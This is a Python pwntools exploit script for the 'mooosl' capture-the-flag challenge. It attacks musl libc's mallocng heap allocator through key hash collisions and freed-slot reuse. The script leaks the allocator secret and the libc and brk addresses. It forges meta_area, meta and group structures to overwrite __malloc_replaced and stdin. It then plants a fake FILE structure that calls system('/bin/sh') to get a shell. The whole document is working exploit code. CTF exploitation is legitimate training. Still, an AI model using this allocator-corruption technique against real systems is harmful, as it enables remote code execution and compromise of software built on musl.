

from pwn import *

HOST, PORT = 'mooosl.challenges.ooo', 23333

context.terminal = ['tmux', 'splitw', '-h', '-F#{pane_pid}', '-P' ]
exe = context.binary = ELF('./mooosl')
libc = ELF('./libc.so')

if args['REMOTE']:
    io = remote(HOST, PORT)
else:
    io = process(exe.path)

def menu(i):
    io.sendlineafter('option:', str(i))

def store(key_size, key, value_size, value):
    menu(1)
    io.sendlineafter(':', str(key_size))
    io.sendafter(':', key)
    io.sendlineafter(':', str(value_size))
    io.sendafter(':', value)
    assert b'ok' in io.readline()

def query(key_size, key):
    menu(2)
    io.sendlineafter(':', str(key_size))
    io.sendafter(':', key)
    line = io.readline()
    if b':' not in line:
        return (-1,line)
    i,v = line.decode().split(':')
    assert b'ok' in io.readline()
    i = int(i, 16)
    v = bytes.fromhex(v)
    return (i, v)

def delete(key_size, key):
    menu(3)
    io.sendlineafter(':', str(key_size))
    io.sendafter(':', key)
    assert b'ok' in io.readline()


store(3, 'Foo', 1, 'a')
store(3, 'Bar', 1, 'a')
store(3, 'AAA', 1, 'a')
value_size = 8000
store(3, '~Dn', value_size, 'a' * value_size) # collision
store(3, '~Iy', 1, 'b') # collision
# ======= Double Free =======
# delete(2, 'x+')
# delete(2, 'x+')
# ===========================

# avail_mask = 0000000
for i in range(2):
    store(1, str(i), 2, 'x+')

# leak metadata base
delete(3, 'Foo') # freed_mask = 0000001
delete(3, 'Bar') # freed_mask = 0000011
delete(3, 'AAA') # freed_mask = 0000111
delete(3, '~Dn') # freed_mask = 0001111
store(2, 'A1', 4000, 'a' * 4000) # avail_mask = 0001110
store(2, 'A2', 4000, 'a' * 4000) # avail_mask = 0001100
_, leak = query(3, '~Dn')

metadata = u64(leak[0xfe0:0xfe8]) & -4096
print("metadata: " + hex(metadata))

# leak metadata context
fake_node = flat(
    metadata, metadata, # key     , value
           0,    0x100, # key_size, value_size
      0x07e5,        0  # hash_val, nxt
)
store(3, 'Foo', 0x30, fake_node) # allocate node '~Dn' avail_mask = 0000000
_, leak = query(0,'')

secret = u64(leak[0x00:0x08])
brk = u64(leak[0x28:0x30]) - 0x7040
libc = u64(leak[0xf0:0xf8]) - 0xb7040

print("secret: " + hex(secret))
print("brk: " + hex(brk))
print("libc: " + hex(libc))


# build fake `meta area` and `meta` struct

# struct meta_area {
# 	uint64_t check;
# 	struct meta_area *next;
# 	int nslots;
# 	struct meta slots[];
# };
fake_meta_area = flat(
    secret,     0,
    0xb00c
)

# struct meta {
# 	struct meta *prev, *next;
# 	struct group *mem;
# 	volatile int avail_mask, freed_mask;
# 	uintptr_t last_idx:5;
# 	uintptr_t freeable:1;
# 	uintptr_t sizeclass:6;
# 	uintptr_t maplen:8*sizeof(uintptr_t)-12;
# };
fake_meta_addr = libc - 0x1000 + 0x18
fake_mem_addr  = libc - 0x2000 + 0x50
 
fake_meta = flat (
                 0, 0,
     fake_mem_addr, 0,
             0x362,
)

fake_metadata = fake_meta_area + fake_meta

# struct group {
# 	struct meta *meta;
# 	unsigned char active_idx:5;
# 	char pad[UNIT - sizeof(struct meta *) - 1];
# 	unsigned char storage[];
# };
# base [0:8] | offset_32 [8:12] | is_offset_32 [12:13] | idx [13:14] | offset_16 [14:16]
fake_group = flat (
    fake_meta_addr,  0x0000a00000000002          
)

freeable_1 = brk  + 0x7d20  # 'x+'
freeable_2 = brk  + 0x7e30  # 'AHOY'

fake_chunk = flat (
    freeable_1, freeable_2,
             2,          1,
    0xda8667e8,          0,
).ljust(0x138, b'\x00') + p64(0x3c)

fake_mem = fake_group + fake_chunk

delete(2, 'A1') # freed_mask = 0000001
delete(2, 'A2') # freed_mask = 0000011
delete(1, '0')  # freed_mask = 0010011
store(2, 'x+', 1, 'a') # avail_mask = 0010010
store(2, '}6', 8000, fake_mem.ljust(4016, b'A') + fake_metadata + b'\n') # avail_mask = 0010000
delete(2, 'x+') # avail_mask = 0010000, freed_mask = 0000001


fake_chunk = flat(
    0, 0,
    0, 0,
    0, fake_mem_addr+0x10
)


store(4, 'AHOY', 0x30, fake_chunk)
delete(2, 'x+')


__malloc_replaced = libc + 0xb6f64 + 2
target = __malloc_replaced

fake_meta_area = flat(
    secret,     0,
    0xb00c
)
fake_meta = flat (
        fake_meta_addr, fake_meta_addr,
                target, 0x0000000100000000,
                0x362,
)

fake_metadata = fake_meta_area + fake_meta
delete(2, '}6')
store(3, 'AAA', 8000, b'A'.ljust(4000, b'A') + fake_metadata + b'\n')
store(13, 'GIVE ME FLAG!', 256,  '\n')

stdin = libc + 0xb4150
target = stdin
fake_meta = flat (
        fake_meta_addr, fake_meta_addr,
                target, 0x0000000100000000,
                0x362,
)
fake_metadata = fake_meta_area + fake_meta

delete(3, 'AAA')
store(3, 'AAA', 8000, b'A'.ljust(4000 - 0x10, b'A') + fake_metadata + b'\n')

system = libc + 0x50a90

# struct _IO_FILE {
# 	unsigned flags;
# 	unsigned char *rpos, *rend;
# 	int (*close)(FILE *);
# 	unsigned char *wend, *wpos;
# 	unsigned char *mustbezero_1;
# 	unsigned char *wbase;
#   ...
# }
_IO_FILE = b"/bin/sh\x00" + flat(
    0, 0, 0, 0, 1, 2, 3, 0, system
)
store(13, 'GIVE ME FLAG!', 256,  _IO_FILE.ljust(0x100, b'\x00'))
io.sendlineafter(':', '4')

io.interactive()
# FLAG: OOO{Hello! Mr. Feng Shui}

